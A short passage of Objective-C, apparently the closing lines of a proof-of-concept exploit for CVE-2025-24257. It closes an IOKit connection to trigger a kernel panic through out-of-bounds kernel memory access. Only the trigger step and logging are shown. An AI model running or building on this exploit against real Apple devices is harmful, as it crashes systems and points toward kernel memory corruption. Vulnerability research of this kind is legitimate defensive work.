    //   FAR = unmapped kernel address past kalloc.type.var*.16 zone page
    NSLog(@"[CVE-2025-24257] Closing connection → kernel panic...");
    IOServiceClose(conn);

    // Never reached
    NSLog(@"[CVE-2025-24257] Unexpected: no panic");
